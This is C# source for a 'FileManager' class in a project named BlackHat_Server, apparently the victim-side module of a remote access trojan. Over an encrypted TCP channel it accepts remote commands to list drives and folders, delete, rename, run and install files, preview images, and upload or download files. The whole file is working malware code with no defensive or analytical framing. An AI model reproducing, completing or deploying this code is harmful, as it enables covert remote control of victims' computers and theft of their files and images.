using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Windows.Forms;

namespace BlackHat_Server
{
    class FileManager
    {
        //NetworkStream myNetStream = null;
        TcpClient myTcpClient = null;

        static bool closeFileManager = false;
        static bool closeImagePreview = false;
        static bool closeGalleryChannel = false;
        
        static bool isImageWorking = false;
        static bool isGalleryWorking = false;

        

        
        public FileManager(TcpClient ctor_tcp)
        {
            myTcpClient = ctor_tcp;
        }


        /// <summary>
        /// Avvia un nuovo thread FileManager
        /// </summary>
        public void StartFMThread()
        {
            System.Threading.Thread t = new System.Threading.Thread(StartFileManager);
            t.IsBackground = true;
            t.Start();
        }
        //--------------------------------------

        /// <summary>
        /// Esce dal Loop di ascolto
        /// </summary>
        public void StopFileManager()
        {
            closeFileManager = true;
            
        }


        /// <summary>
        /// Esce dal Loop di ascolto
        /// </summary>
        public void StopImagePreview()
        {
            if (isImageWorking)
                closeImagePreview = true;
        }

        /// <summary>
        /// Esce dal Loop di Gallery
        /// </summary>
        public void StopGallery()
        {
            if (isGalleryWorking)
                closeGalleryChannel = true;
        }

        /// <summary>
        /// Thread Principale del FileManager.. Comunica tramite mainStream FileManager
        /// Risponde a Listare file, eseguire file e aprire thread per trasmissione file!
        /// </summary>
        private void StartFileManager()
        {                        
            try
            {
                MsgManager mm = new MsgManager(myTcpClient.GetStream());

                while (!closeFileManager || !ST_Client.Instance.isConnected)
                {
                    string fmRequest = mm.WaitForEncryMessageRicorsive(10000);

                    if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                        Interpreter(fmRequest);
                    
                }

                //  USCITO DA LOOP IL THREAD MUORE
                myTcpClient.GetStream().Close();
                myTcpClient.Close();
                closeFileManager = false; // E' STATICO CAZZONE!!!!!!

                // RIMUOVO DA LISTA
                if (ST_Client.Instance.nsListaCanali.Contains(myTcpClient.GetStream()))
                    ST_Client.Instance.nsListaCanali.Remove(myTcpClient.GetStream());

            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
            }
        }
        //--------------------------------------


        /// <summary>
        /// Interprete Del Messaggio Di richiesta
        /// </summary>
        /// <param name="msg"></param>
        private void Interpreter(string msg)
        {
            
            string[] msgSplitted = msg.Split('|');
            switch (msgSplitted[0])
            {
                // LISTA I DRIVES
                case "LIST_DRIVE":
                    ListFiles lf = new ListFiles(myTcpClient.GetStream());
                    lf.StartListDevices();
                    break;

                // LISTA CARTELLE SPECIALI
                case "LIST_SPECIAL":
                    ListFiles lfd = new ListFiles(myTcpClient.GetStream());
                    lfd.StartListSpecial();
                    break;

                // LISTA FILE IN DIR
                case "LIST_CONTENT":
                    string dir = msgSplitted[1];
                    ListFiles lfdir = new ListFiles(myTcpClient.GetStream(), dir);
                    lfdir.StartListFile();
                    break;
               
                // LISTA FILE IN DIR
                case "FILE_DELETE":
                    FileManAction fma = new FileManAction(msgSplitted[1],myTcpClient.GetStream());
                    fma.StartDelFile();
                    break;

                // LISTA RUN FILES
                case "FILE_RUN":
                    FileManAction fmarun = new FileManAction(msgSplitted[2], myTcpClient.GetStream());
                    fmarun.StartRunFiles(msgSplitted[1]);
                    break;

                // RENAME FILE
                case "FILE_RENAME":
                    FileManAction fmren = new FileManAction(myTcpClient.GetStream());
                    fmren.StartRename(msgSplitted[1],msgSplitted[2]);
                    break;

                // CREATE NEW FOLDER
                case "FILE_NEW_FOLDER":
                    FileManAction fmaNF = new FileManAction(myTcpClient.GetStream());
                    fmaNF.StartNewFolderCration(msgSplitted[1]);                    
                    break;


                // INSTALL FILE
                case "FILE_INSTALL":
                    FileManAction fmaIF = new FileManAction(myTcpClient.GetStream());
                    fmaIF.StartInstallFile(msgSplitted[1], msgSplitted[2]);
                    break;

                                   

                    
                    
                // RICHIESTA DI CHIUSURA STREAM
                case "CLOSE_CONNECTION":
                    StopFileManager();
                    StopImagePreview();
                    StopGallery();
                   
                    break;
                default:
                    break;
            }
        }
        //----------------------------------------







      
        /// <summary>
        /// Avvia un nuovo thread Image PReview
        /// </summary>
        public void StartIMThread()
        {
            System.Threading.Thread t = new System.Threading.Thread(StartImagePreviewManager);
            t.IsBackground = true;
            t.Start();
        }
        //--------------------------------------

        /// <summary>
        /// Thread cominicazione invio image preview
        /// </summary>
        private void StartImagePreviewManager()
        {
            try
            {
                MsgManager mm = new MsgManager(myTcpClient.GetStream());
                isImageWorking = true;

                while (!closeImagePreview || !ST_Client.Instance.isConnected)
                {
                    string fmRequest = mm.WaitForEncryMessageRicorsive(10000);

                    if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                    {
                        string[] msgSplitted = fmRequest.Split('|');

                        if (msgSplitted[0] == "IMAGE_PREVIEW")
                        {
                            FileManAction fmaIM = new FileManAction(myTcpClient.GetStream());
                            fmaIM.StartImagePreview(msgSplitted[1]);    
                        }
                    }

                }

                //  USCITO DA LOOP IL THREAD MUORE
                myTcpClient.GetStream().Close();
                myTcpClient.Close();
                closeImagePreview = false; // E' STATICO CAZZONE!!!!!!
                isImageWorking = false;

                // RIMUOVO DA LISTA
                if (ST_Client.Instance.nsListaCanali.Contains(myTcpClient.GetStream()))
                    ST_Client.Instance.nsListaCanali.Remove(myTcpClient.GetStream());

            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
                isImageWorking = false;
            }
        }
        //--------------------------------------




        /// <summary>
        /// Avvia un nuovo thread Image PReview
        /// </summary>
        public void StartGalleryThread()
        {
            System.Threading.Thread t = new System.Threading.Thread(StartGalleryManager);
            t.IsBackground = true;
            t.Start();
        }
        //--------------------------------------

        /// <summary>
        /// Thread cominicazione invio image preview
        /// </summary>
        private void StartGalleryManager()
        {
            try
            {
                MsgManager mm = new MsgManager(myTcpClient.GetStream());
                isGalleryWorking = true;

                while (!closeGalleryChannel || !ST_Client.Instance.isConnected)
                {
                    string fmRequest = mm.WaitForEncryMessageRicorsive(10000);

                    if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                    {
                        string[] msgSplitted = fmRequest.Split('|');

                        if (msgSplitted[0] == "IMAGE_GALLERY")
                        {
                            FileManAction fmaIM = new FileManAction(myTcpClient.GetStream());
                            fmaIM.StartImageGallery(msgSplitted[1]);
                        }
                    }

                }

                //  USCITO DA LOOP IL THREAD MUORE
                myTcpClient.GetStream().Close();
                myTcpClient.Close();
                closeGalleryChannel = false; // E' STATICO CAZZONE!!!!!!
                isGalleryWorking = false;

                // RIMUOVO DA LISTA
                if (ST_Client.Instance.nsListaCanali.Contains(myTcpClient.GetStream()))
                    ST_Client.Instance.nsListaCanali.Remove(myTcpClient.GetStream());
                
            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
                isGalleryWorking = false;
            }
        }
        //--------------------------------------




        /// <summary>
        /// Avvia un nuovo thread Per invio File
        /// </summary>
        public void StartTransfThread()
        {
            System.Threading.Thread t = new System.Threading.Thread(TransfThread);
            t.IsBackground = true;
            t.Start();
        }
        //--------------------------------------

        /// <summary>
        ///
        /// </summary>
        private void TransfThread()
        {
            try
            {
                MsgManager mm = new MsgManager(myTcpClient.GetStream());
                                               
                string fmRequest = mm.WaitForEncryMessageRicorsive(15000); // ASPETTO LA RICHIESTA DEL FILE PER 15 SEC

                if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                {
                    string[] msgSplitted = fmRequest.Split('|');

                    if (msgSplitted[0] == "TRANSFER")
                    {
                        FileManAction fmaIM = new FileManAction(myTcpClient.GetStream());
                        fmaIM.SendFileTrans(msgSplitted[1]);
                    }

                    if (msgSplitted[0] == "UPLOAD")
                    {
                        FileManAction fmaIM = new FileManAction(myTcpClient.GetStream());
                        fmaIM.ReceiveFile(msgSplitted[1]);
                    }
                }

                //  USCITO DA LOOP IL THREAD MUORE
                myTcpClient.GetStream().Close();
                myTcpClient.Close();

                // RIMUOVO DA LISTA
                if (ST_Client.Instance.nsListaCanali.Contains(myTcpClient.GetStream()))
                    ST_Client.Instance.nsListaCanali.Remove(myTcpClient.GetStream());


                
            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
                isImageWorking = false;
            }
        }
        //--------------------------------------




        

    }
}
